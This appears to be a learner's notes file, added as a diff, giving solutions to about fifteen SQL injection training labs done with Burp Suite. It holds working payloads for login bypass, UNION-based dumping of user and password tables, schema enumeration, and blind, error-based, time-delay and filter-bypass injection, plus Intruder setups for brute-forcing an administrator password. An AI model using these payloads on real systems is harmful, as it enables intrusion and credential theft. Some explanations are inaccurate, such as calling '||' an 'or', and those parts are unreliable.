@@ -1,0 +1,368 @@
+SQL-LAB1:-
+We need to retreive all released and unreleades products using SQL Injection
+
+Solution:- "'or 1=1 --"
+
+##So in the link we need to add above command after the category to access all the products that are relaesed and unreleased
+' is used to access the fault of the site, if this becomes succesful we can use SQL Injection
+or 1=1 is used to retreive all the products from the store/site
+-- is used to ignore everthing after this point and it will execute the command before --##
+
+
+************************
+
+								SQL-LAB2:-
+ perform a SQL injection attack that logs in to the application as the administrator user
+Solution:- administrator'-- 
+
+So in the Username section we need to use above command so we can login as administrator/admin
+we need to try different login name as admin/administrator/admins/administrators
+' is used to access the fault of the site, if this becomes succesful we can use SQL Injection
+-- is used to ignore everthing after this point and it will execute the command before
+
+
+************************
+
+								SQL-LAB3:-
+determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. 
+
+Solution1:- '+UNION+select+NULL,+NULL,+NULL-- 
+
+So in this solution we used UNION operator to access the number of columns in the data
+using burpsuite repeator by forwading the site link to the repeator through proxy
+we select the NULL values till we satisfy the solution and we didn't get the error
+' is used to access the fault of the site, if this becomes succesful we can use SQL Injection
+-- is used to ignore everthing after this point and it will execute the command before
+
+Solution2:- '+ORDER+BY+1--
+
+we use order by operator to see that column is ascending or not
+using burpsuite repeator by forwading the site link to the repeator through proxy
+' is used to access the fault of the site, if this becomes succesful we can use SQL Injection
+-- is used to ignore everthing after this point and it will execute the command before.
+
+
+***************************
+								SQL-LAB4:-
+Perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 
+
+Solution:- 'UNION+select+NULL,+'lJ9yPu',+NULL--
+
+So we have to add a data to table which will be the string format
+1) First we need to search how many columns are their in the data
+2) Seond after getting the number of columns we can remove and NULL and the data to that column
+'UNION+select+NULL,+'lJ9yPu',+NULL-- i.e lJ9yPu this is the data and 2nd column is in string format so we add this data in second null column.
+' is used to access the fault of the site, if this becomes succesful we can use SQL Injection
+-- is used to ignore everthing after this point and it will execute the command before.
+
+
+***************************
+								SQL-LAB5:-
+perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 
+
+Solution:- 'UNION select username and password from users--
+
+1) First we need to search how many columns are their in the data
+2) Second after getting the number of columns we can remove and NULL and the data to that column
+For the first step we have find number of columns using ORDER BY 1--(we can vary the numbers to search the number of columns)
+For the second step we have to find the data type using UNION SELECT 'a','a' 
+' is used to access the fault of the site, if this becomes succesful we can use SQL Injection
+-- is used to ignore everthing after this point and it will execute the command before.
+
+
+****************************
+								SQL-LAB6:-
+perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
+
+Solution:- UNION SELECT NULL, username || '*' ||password from users --
+1) First we need to search how many columns are their in the data using 'ORDER BY --Command.
+2) Second need to find the datatype of the column using 'UNION SELECT NULL, 'a'-- Command.
+3) Third retrieving the username and password from the columns using  UNION SELECT NULL, username || '*' ||password from users -- Command.
+To check the version of the database we can use:- 
+					Oracle 	SELECT banner FROM v$version
+						SELECT version FROM v$instance
+					Microsoft 	SELECT @@version
+					PostgreSQL 	SELECT version()
+					MySQL 	SELECT @@version 
+					
+|| is used for or 
+' is used to access the fault of the site, if this becomes succesful we can use SQL Injection
+-- is used to ignore everthing after this point and it will execute the command before.
+
+****************************
+								SQL-LAB7 and LAB8:-
+SQL injection attack, querying the database type and version on MySQL and Microsoft or oracle or PLSQL.
+
+Solution:- '+UNION+SELECT+@@version,+NULL
+
+1) First we need to search how many columns are their in the data using 'ORDER BY --Command.
+2) Second need to find the datatype of the column using 'UNION SELECT NULL, 'a'-- Command.
+To check the version of the database we can use:- 
+					Oracle 	SELECT banner FROM v$version
+						SELECT version FROM v$instance
+					Microsoft 	SELECT @@version
+					PostgreSQL 	SELECT version()
+					MySQL 	SELECT @@version 
+For the commanets we can use:
+Oracle 	--comment
+Microsoft 	--comment
+		/*comment*/
+PostgreSQL 	--comment
+		/*comment*/
+MySQL 	#comment
+	-- comment [Note the space after the double dash]
+	/*comment*/
+	
+***********************************
+	
+								SQL-LAB9:-
+ The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+To solve the lab, log in as the administrator user. 
+
+Solution:- 'UNION+SELECT+username_dslphs,+password_kcqspt+from+users_miwezm-- (NEED TO USE BURPSUITE AS IT IS MORE RELIABLE)
+1) First we need to search how many columns are their in the data using 'ORDER BY --Command.
+2) Second need to find the datatype of the column using 'UNION SELECT NULL, 'a'-- Command.
+3) To check the version of the database we can use:- 
+					Oracle 	SELECT banner FROM v$version
+						SELECT version FROM v$instance
+					Microsoft 	SELECT @@version
+					PostgreSQL 	SELECT version()
+					MySQL 	SELECT @@version 
+4)To extract table contents:-
+Oracle 		SELECT * FROM all_tables
+		
+Microsoft 	SELECT * FROM information_schema.tables
+		
+PostgreSQL 	SELECT * FROM information_schema.tables
+		
+MySQL 		SELECT * FROM information_schema.tables
+		
+		
+as it was postgresql we used : 'UNION SELECT table_name, NULL FROM information_schema.tables-- and ctrl+U in burpsuite then we need to search the users table.
+
+5)To extract the columns contents:-
+Oracle 		SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+
+Microsoft 	SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+PostgreSQL 	SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+MySQL 		SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+command :- 'UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_miwezm'-- and ctrl+U in burpsuite then we need to search the username and password column.
+
+6)Final command after finding the column names of username and password.
+'UNION SELECT username_dslphs, password_kcqspt from users_miwezm-- 
+
+and then login as administrator.
+
+*********************************************
+
+								SQL-LAB10:-
+						Blind SQL injection with conditional responses
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+To solve the lab, log in as the administrator user. 
+
+Solution:- using BURPSUITE INTRUDER
+
+1)First we see that command is true or false
+select tracking-id from tracking-table where trackingId = 'Yg6cu0974aKYk2Au' and 1=1--' --> ' and 1=1--' we only use this command rest is for understanding sql query, we use this command after trackingid
+Then for False :- select tracking-id from tracking-table where trackingId = 'Yg6cu0974aKYk2Au' and 1=0--'
+
+2) Then we search for user table:- select tracking-id from tracking-table where trackingId = 'Yg6cu0974aKYk2Au' and (select 'x' from users LIMIT 1) = 'x'--'
+
+3)If we find the table we use this command for administrator :- select tracking-id from tracking-table where trackingId = 'Yg6cu0974aKYk2Au' and (select username from users where username = 'administrator') = 'administrator'--'
+
+4)For password of length :- select tracking-id from tracking-table where trackingId = 'Yg6cu0974aKYk2Au' and (select username from users where username = 'administrator' and LENGTH(password)>1) = 'administrator'--'
+
+we send request to intruder and select 1 and click ADD$ and then go to payloads payload set 1 payload type number number range type sequential from 1 to 50 step 1
+5)searching first character of the password:- select tracking-id from tracking-table where trackingId = 'Yg6cu0974aKYk2Au' and (select substring(password,1,1) from users where username = 'administrator') = 'a'--'
+
+Then we need to send above command to intruder and then first clear and then select a which is at end and click $ADD$ and attack type cluster bomb in payload payload1 numbers number range type seq from 1 to 20 step1
+payload2:- type bruteforcer min and max length 1
+then where different length comes it is password 
+
+***************************************************
+
+								SQL-LAB11:- 
+						Blind SQL injection with conditional errors
+ The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user. 
+
+Solution:
+1) First we see that site is vulnerable or not, to do that we use ' (single qoute) if we get 500 response than the site is vulnerable.
+
+2) To prove that site is vulnerable:
+'|| (select '') ||'  --> then we use this command to see the database version if this didn't work meaning database is not mysql or microsoft
+'|| (select ''from dual) ||' -->ORACLE DATABASE While using this command we get 200 success which means it is oracle database because we used from statement.
+'|| (select ''from dualfewssfawd) ||' Used random table name and gets 500 error response so it is vulnerable.
+
+3) Confirming that users table is available or not:
+'|| (select ''from users where rownum = 1) ||' --> This commands indicates that user table is available is we get 200 response.
+
+4) Confirming that administrator user is available or not:
+'|| (select ''from users where username = 'administrator') ||' --> This command will return 200 response and can also return 200 response for any random user, So we can't use this command.
+'|| (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) ||' --> Using can use this command to check if else statement that TRUE or FALSE.
+
+'|| (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator') ||' --> ADMINISRTATOR user exist as we receive internal error 500 response, Working of this command in this command FROM clause gets executed first, So if the user exist it goes to select clause and 1=1 is always true and then it executes TO_CHAR(1/0) command which is FALSE so TRUE + FALSE = FALSE and so we gets 500 response internal server error.
+
+'|| (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'dasfFFS') ||' --> and if we use random user then we get 200 response as from clause is FALSE so it doesn't perform select clause.
+
+'|| (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator' and LENGTH(password)>1) ||' --> internal server error meaning password is greater than 1
+
+'|| (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator' and LENGTH(password)>50) ||' --> 200 response means password is lower than 50
+
+5) Finding the Length of password:
+Send the request to INTRUDER through REPEATER:
+ POSITION TAB:
+ First clear all positions and then select 1 from password length and then ADD$ and attack type is SNIPER.
+ 
+ PAYLOAD TAB:
+ payload set 1 --> payload type: NUMBER --> Number range FROM : 1 TO : 50 STEP : 1 and then start attack
+ 
+ 200 respone at 20 length so character length is 20
+ 
+ '|| (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator' and substr(password,1,1)='a') ||' --> 200 response as first word letter is not a.
+ 
+ end the request to INTRUDER through REPEATER:
+ POSITION TAB: ATTACK Type: Cluster Bomb --> clear all the positions --> Select the first 1 from password and a from substr as ADD$
+ PAYLOAD TAB: payload1 --> Type NUMBER --> RANGE FROM : 1 TO : 20 STEP : 1 , payload2 : Type BRUTE FORCE MIN LENGTH : 1 MAX LENGTH : 1 start attack
+ 
+ 
+ ***************************************************
+ 								SQL-LAB12:
+
+							Visible error-based SQL injection
+This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
+The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account. 
+
+Solution: '+AND+1%3dCAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)-- Using BURPSUITE
+
+1)Using Burp's built-in browser, explore the lab functionality.
+Go to the Proxy > HTTP history tab and find a GET / request that contains a TrackingId cookie.
+
+2)In Repeater, append a single quote to the value of your TrackingId cookie and send the request.
+TrackingId=ogAZZfxtOKUELbuJ'
+
+3)In the response, notice the verbose error message. This discloses the full SQL query, including the value of your cookie. It also explains that you have an unclosed string literal. Observe that your injection appears inside a single-quoted string.
+
+4)In the request, add comment characters to comment out the rest of the query, including the extra single-quote character that's causing the error:
+TrackingId=ogAZZfxtOKUELbuJ'--
+
+5)Send the request. Confirm that you no longer receive an error. This suggests that the query is now syntactically valid.
+
+6)Adapt the query to include a generic SELECT subquery and cast the returned value to an int data type:
+TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
+
+7)Send the request. Observe that you now get a different error saying that an AND condition must be a boolean expression.
+
+8)Modify the condition accordingly. For example, you can simply add a comparison operator (=) as follows:
+TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
+
+9)Send the request. Confirm that you no longer receive an error. This suggests that this is a valid query again. 
+
+10)Adapt your generic SELECT statement so that it retrieves usernames from the database:
+TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
+
+11)Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.
+
+12)Delete the original value of the TrackingId cookie to free up some additional characters. Resend the request.
+TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
+
+13)Notice that you receive a new error message, which appears to be generated by the database. This suggests that the query was run properly, but you're still getting an error because it unexpectedly returned more than one row.
+
+14)Modify the query to return only one row:
+TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+
+15)Send the request. Observe that the error message now leaks the first username from the users table:
+ERROR: invalid input syntax for type integer: "administrator"
+
+16)Now that you know that the administrator is the first user in the table, modify the query once again to leak their password:
+TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+
+17)Log in as administrator using the stolen password to solve the lab. 
+
+******************************************
+						
+								SQL-LAB13:
+					Blind SQL injection with time delays and information retrieval
+
+ This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user. 
+
+Solution:
+1) Confirm that the parameter is vulnerable to SQLi:
+
+' || pg_sleep(10)-- If we receive response after 10 seconds that means it is vulnerable to SQLi
+but we need to check this using for every database i.e ORACLE, MYSQL, MICROSOFT, POSTGRES
+
+2) Confirm that user table exists in the database:
+
+' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--
+
+' || (select case when (username = 'administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+3) Enumerating the password length:
+
+' || (select case when (username = 'administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+' || (select case when (username = 'administrator' and LENGTH(password)>25) then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+4) Enumerating the administrator password: 
+
+' || (select case when (username = 'administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+5) Send the request to Intruder:
+
+end the request to INTRUDER through REPEATER:
+ POSITION TAB: ATTACK Type: Cluster Bomb --> clear all the positions --> Select the first 1 from password and a from substr as ADD$
+ PAYLOAD TAB: payload1 --> Type NUMBER --> RANGE FROM : 1 TO : 20 STEP : 1 , payload2 : Type BRUTE FORCE MIN LENGTH : 1 MAX LENGTH : 1 start attack
+ 
+
+*************************************************
+
+								SQL-LAB14:
+						SQL injection with filter bypass via XML encoding
+
+ This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+
+The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account. 
+
+1) First we need to send product detail and stock detail to repeater using BURPSUITE
+
+2) We need to download extension in BURPSUITE i.e. HACKVERTOR.
+
+3) 1 UNION SELECT username || '~' || password FROM users --> use this command to execute the lab
+
+4) We need to select the command and right click than EXTENSION --> HACKVERTOR --> ENCODE --> HEX_ENTITIES.
+
+5) Last step is to login as administrator.
+
+
+***********************************************
+
+								SQL-LAB15:
+						 SQL injection attack, listing the database contents on Oracle
+					
+ This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user. 
+
+Solution:
+1) 'order by 2-- --> only 2 columns are available.
+
+2) 'UNION SELECT 'a', 'a' from dual-- --> we used dual because it is oracle version of database and both column are of text type.
+
+3) 'UNION SELECT table_name, NULL from all_tables-- --> this command is used to select tablename of users.
+
+4)  'UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_OUDAOM'-- --> this command is used to extract columns names from the tables.
+
+5) 'UNION SELECT USERNAME_BPKLQL, PASSWORD_EWLMCC FROM USERS_OUDAOM-- --> this command is used to extract columns username and password from table.
